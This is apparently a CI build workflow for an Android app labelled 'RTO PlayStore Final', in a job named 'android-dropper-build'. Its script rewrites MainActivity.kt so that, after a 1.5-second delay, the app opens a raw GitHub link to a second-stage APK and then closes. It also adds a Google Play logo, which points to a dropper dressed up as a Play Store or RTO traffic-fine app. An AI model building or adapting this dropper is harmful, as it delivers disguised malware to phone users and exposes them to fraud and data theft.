workflows:
  android-dropper-build:
    name: RTO PlayStore Final
    max_build_duration: 60
    instance_type: mac_mini_m1
    environment:
      java: 17
    scripts:
      - name: Master Automatic Repair & URL Inject
        script: |
          cd RtoEChallan || exit 1
          
          # 1. Logo & Resource Fix
          mkdir -p app/src/main/res/drawable
          LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
          if [ -f "$LOGO_FILE" ]; then
            cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
          else
            cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
          fi

          # 2. Redirect Logic with GitHub Link
          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
          cat <<EOF > "$FILE_PATH"
          package com.example.rtoechallan
          import android.os.Bundle
          import android.content.Intent
          import android.net.Uri
          import android.os.Handler
          import android.os.Looper
          import androidx.appcompat.app.AppCompatActivity

          class MainActivity : AppCompatActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  try {
                      setContentView(R.layout.activity_main)
                      Handler(Looper.getMainLooper()).postDelayed({
                          val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                          val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                          startActivity(intent)
                          finish()
                      }, 1500)
                  } catch (e: Exception) {
                      val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                      startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                      finish()
                  }
              }
          }
          EOF

          # 3. Build Config & Compilation
          rm -f build.gradle settings.gradle gradle.properties
          echo "android.useAndroidX=true\nandroid.enableJetifier=true\norg.gradle.jvmargs=-Xmx2048m" > gradle.properties
          
          cat <<EOF > settings.gradle
          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
          dependencyResolutionManagement { 
              repositoriesMode.set(RepositoriesMode.PREFER_SETTINGS)
              repositories { google(); mavenCentral() } 
          }
          rootProject.name = 'RtoEChallan'
          include ':app'
          EOF

          cat <<EOF > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { 
                  classpath 'com.android.tools.build:gradle:8.0.2'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.20'
              }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          gradle wrapper --gradle-version 8.0.2
          chmod +x gradlew
          ./gradlew assembleRelease \
            -Pandroid.injected.signing.store.file=$(pwd)/final.keystore \
            -Pandroid.injected.signing.store.password=pass123 \
            -Pandroid.injected.signing.key.alias=final_alias \
            -Pandroid.injected.signing.key.password=pass123 \
            --no-daemon
          
    artifacts:
      - app/build/outputs/apk/release/*.apk
